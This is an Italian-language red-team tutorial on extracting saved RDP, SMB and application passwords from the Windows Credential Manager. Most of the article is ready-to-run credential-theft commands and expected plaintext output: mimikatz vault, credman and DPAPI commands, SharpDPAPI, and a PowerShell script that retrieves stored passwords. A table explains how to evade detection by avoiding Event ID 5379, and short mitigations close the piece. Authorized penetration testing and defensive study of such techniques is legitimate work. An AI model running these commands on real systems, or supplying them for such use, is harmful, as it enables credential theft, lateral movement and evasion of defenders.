---
title: 'SeTrustedCredManAccessPrivilege: Dump RDP e Vault con Mimikatz'
slug: setrustedcredmanaccessprivilege
description: >-
  Estrai password RDP e credenziali dal Credential Manager con
  SeTrustedCredManAccessPrivilege. Usa cmdkey, mimikatz, SharpDPAPI. Guida Red
  Team passo passo.
image: /SeTrustedCredManAccessPrivilege.webp
draft: false
date: 2026-06-21T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - privilege-escalation
tags:
  - setrustedcredmanaccessprivilege
  - credential-manager-dump
  - mimikatz
---

# SeTrustedCredManAccessPrivilege: Dump Credenziali RDP e Password Salvate dal Credential Manager

Hai compromesso una workstation di gestione. Prima ancora di cercare altri vettori, lancia `cmdkey /list` — zero privilegi richiesti. Se gli admin hanno salvato credenziali RDP, SMB o applicative, le vedi subito. Poi usi mimikatz o SharpDPAPI per estrarle in chiaro.

***

## Quick Exploit

```cmd
cmdkey /list
```

Se ci sono entry interessanti:

```cmd
mimikatz.exe "token::elevate" "vault::cred /patch" exit
```

Output atteso:

```
Target  : TERMSRV/server01.corp.local
Username: CORP\Administrator
Password: P@ssw0rd123
```

***

## Attack Chain

```
Workstation admin compromessa
  → cmdkey /list → enumera credenziali salvate (nessun privilegio)
  → mimikatz vault::cred /patch → estrai password in chiaro
  OPPURE
  → mimikatz sekurlsa::credman (via SeDebugPrivilege) → da LSASS
  OPPURE
  → SharpDPAPI credentials → catena DPAPI → decifrazione completa
  → RDP / SMB con credenziali estratte → lateral movement
```

***

## Tool Decision

| Scenario                              | Comando                                                |
| ------------------------------------- | ------------------------------------------------------ |
| Enumerazione rapida (no privilegi)    | `cmdkey /list`                                         |
| Estrazione password con token elevato | `mimikatz vault::cred /patch`                          |
| Dal dump LSASS (via SeDebugPrivilege) | `mimikatz sekurlsa::credman`                           |
| Catena DPAPI completa                 | `SharpDPAPI.exe credentials` / `SharpDPAPI.exe vaults` |
| Zero tool esterni                     | PowerShell `PasswordVault` API                         |
| File vault con master key nota        | `mimikatz dpapi::cred /in:[GUID] /masterkey:[hex]`     |

***

## Cos'è SeTrustedCredManAccessPrivilege

Permette di accedere al Windows Credential Manager come processo trusted. Il Vault memorizza: credenziali RDP salvate, password di share SMB, token applicativi, credenziali enterprise. Normalmente ogni utente legge solo il proprio vault — questo privilegio sblocca l'accesso al vault di altri utenti sulla stessa macchina.

In ambienti dove gli admin salvano le credenziali RDP di 20 server, il Credential Manager è un goldmine.

***

## Quando esiste

Quasi esclusivamente su processi di sistema core (`lsass.exe`, `winlogon.exe`). Su account normali: rarissimo come privilegio esplicito.

Il vettore più pratico in pentest **non richiede questo privilegio** — `cmdkey /list` e `sekurlsa::credman` funzionano con i privilegi normali o con SeDebugPrivilege.

Verifica:

```cmd
whoami /priv | findstr SeTrustedCredMan
```

***

## Step 1 — Enumera il Credential Manager (nessun privilegio necessario)

Questo funziona su qualsiasi account senza privilegi speciali:

```cmd
cmdkey /list
```

Output:

```
Currently stored credentials:

    Target: Domain:target=SERVER01
    Type: Domain Password
    User: CORP\Administrator

    Target: LegacyGeneric:target=http://jenkins.corp.local
    Type: Generic
    User: deploy_user

    Target: TERMSRV/dc01.corp.local
    Type: Domain Password
    User: CORP\DomainAdmin
```

Esegui su ogni account compromesso — spesso sufficiente per capire il valore del target.

***

## Step 2 — Estrai le password con mimikatz

Con token elevato, mimikatz accede al vault e decripta le credenziali:

```cmd
mimikatz.exe "token::elevate" "vault::list" exit
```

Poi estrai con decifrazione:

```cmd
mimikatz.exe "token::elevate" "vault::cred /patch" exit
```

Output:

```
[0] - RDP Target
  Type    : domain_password
  Target  : TERMSRV/server01.corp.local
  Username: CORP\Administrator
  Password: P@ssw0rd123
```

***

## Varianti

### sekurlsa::credman — dal dump LSASS (via SeDebugPrivilege)

Il metodo più diretto. Non richiede SeTrustedCredManAccessPrivilege, ma SeDebugPrivilege:

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::credman" exit
```

Output: password RDP salvate, credenziali share SMB, token applicativi — estratti direttamente dalla memoria di lsass.

### SharpDPAPI — catena DPAPI completa

Le credenziali nel vault sono cifrate con DPAPI usando la master key dell'utente. SharpDPAPI gestisce automaticamente la catena di decifrazione. Scaricabile da [GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI):

```cmd
SharpDPAPI.exe credentials
```

```cmd
SharpDPAPI.exe vaults
```

Output: credenziali decifrate dove la master key è accessibile nel contesto corrente.

### PowerShell Vault API — zero tool esterni

Funziona per il vault dell'utente corrente senza tool aggiuntivi:

```powershell
[void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | ForEach-Object {
    $_.RetrievePassword()
    [PSCustomObject]@{
        Resource = $_.Resource
        UserName = $_.UserName
        Password = $_.Password
    }
}
```

### Accesso diretto ai file del vault

Le credenziali sono salvate cifrate con DPAPI in questi path:

```
%APPDATA%\Microsoft\Credentials\
%LOCALAPPDATA%\Microsoft\Credentials\
C:\Users\[user]\AppData\Roaming\Microsoft\Credentials\
```

Lista i file:

```cmd
dir %APPDATA%\Microsoft\Credentials\ /a
dir %LOCALAPPDATA%\Microsoft\Credentials\ /a
```

Decifra con mimikatz specificando il file:

```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\[user]\AppData\Roaming\Microsoft\Credentials\[GUID]" exit
```

Se sei nell'account dell'utente → decifrazione automatica (context-based DPAPI).

Se sei un altro utente → devi prima estrarre la master key da LSASS:

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::dpapi" exit
```

Poi usa la master key per decifrare:

```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\[user]\AppData\Roaming\Microsoft\Credentials\[GUID] /masterkey:[hex]" exit
```

***

## Scenari reali

**Workstation di gestione condivisa** — tre admin usano lo stesso jump server e hanno salvato le credenziali RDP. `cmdkey /list` mostra 20 entry → `sekurlsa::credman` → password in chiaro per tutti i server → RDP diretto.

**Account di monitoraggio** — tool di monitoring con credenziali salvate verso tutti i sistemi monitorati. Comprometti l'account → vault dump → accesso a tutta l'infrastruttura.

**Applicazione legacy** — applicazione enterprise che usa Credential Manager API per salvare credenziali database. `cmdkey /list` mostra il target, vault dump mostra le credenziali.

***

## Errori comuni

**`vault::cred /patch` mostra entry ma password vuota** — Credenziali con protezione aggiuntiva (richiedono prompt UAC all'uso). Usa SharpDPAPI per la catena DPAPI completa: `SharpDPAPI.exe credentials`.

**SharpDPAPI non decifra** — Non hai la master key dell'utente. Prima estrai la master key da LSASS: `mimikatz privilege::debug sekurlsa::dpapi exit`, poi usa la chiave hex estratta: `mimikatz dpapi::cred /in:[GUID] /masterkey:[hex]`.

**Nessuna entry in `cmdkey /list`** — Nessuna credenziale salvata per l'utente corrente. Prova su altri account compromessi sulla stessa macchina o cerca nei vault degli altri utenti se hai SeTrustedCredManAccessPrivilege.

**`sekurlsa::credman` restituisce risultati vuoti** — Nessuna credenziale Credential Manager in memoria lsass. Le credenziali potrebbero essere solo su disco — usa SharpDPAPI invece.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                                | Come lo bypassa il Red Team                                                 |
| ------------------------------------------------------- | --------------------------------------------------------------------------- |
| **Event ID 5379** — credential manager credentials read | Usa `sekurlsa::credman` via dump LSASS — non genera 5379, accede da memoria |
| `cmdkey.exe` da contesti non interattivi                | Usa PowerShell `PasswordVault` API invece — pattern diverso                 |
| Accesso a `%APPDATA%\Microsoft\Credentials\`            | Usa SharpDPAPI che accede in modo più silenzioso rispetto a copia diretta   |

***

## Quando fallisce

* `vault::cred /patch` → password vuota → protezione aggiuntiva → usa SharpDPAPI
* SharpDPAPI non decifra → master key mancante → estrai prima con `sekurlsa::dpapi`
* Nessuna entry in `cmdkey /list` → nessuna credenziale salvata per quell'utente

***

## Mitigazioni

* Non salvare credenziali privilegiate nel Credential Manager — usa CyberArk, Thycotic, Keeper
* Policy di gruppo per limitare il salvataggio credenziali da account privilegiati
* Alert su Event ID 5379 per accessi anomali al vault

**Nota realistica:** In ambienti enterprise, gli admin salvano spesso credenziali RDP per "velocizzare il lavoro". Le workstation di gestione condivise (jump server) sono i target più ricchi — `cmdkey /list` su questi sistemi restituisce spesso decine di credenziali.

***

## FAQ

**`cmdkey /list` mostra solo i nomi, non le password?**
Corretto — elenca le entry ma non le password. Per le password: `vault::cred /patch`, SharpDPAPI, o PowerShell PasswordVault API.

**I browser usano il Windows Credential Manager?**
Edge legacy e Internet Explorer sì. Chrome e Firefox usano store propri. Le applicazioni enterprise con Credential Manager API integrata sono il target principale.

**SeTrustedCredManAccessPrivilege è necessario?**
Per il vault dell'utente corrente: no. Per vault di altri utenti sulla stessa macchina: sì. In pratica `sekurlsa::credman` via SeDebugPrivilege è spesso il percorso più diretto.

***

`cmdkey /list` è uno dei primi comandi da eseguire dopo qualsiasi compromissione di workstation — zero privilegi, output immediato, spesso goldmine.

***

**Articoli correlati:**

* [SeDebugPrivilege](https://hackita.it/articoli/sedebugprivilege) — `sekurlsa::credman` via LSASS dump
* [SeBackupPrivilege](https://hackita.it/articoli/sebackupprivilege) — credential dump alternativo da SAM/NTDS
* [DPAPI](https://hackita.it/articoli/dpapi/) - \[DPAPI su Windows per pentester]\(DA CREARE)

**Riferimenti:** [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) · [Mimikatz](https://github.com/gentilkiwi/mimikatz) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-credential-manager-as-a-trusted-caller)

Per supporto su engagement con analisi DPAPI e Credential Manager: [hackita.it/supporto](https://hackita.it/supporto)
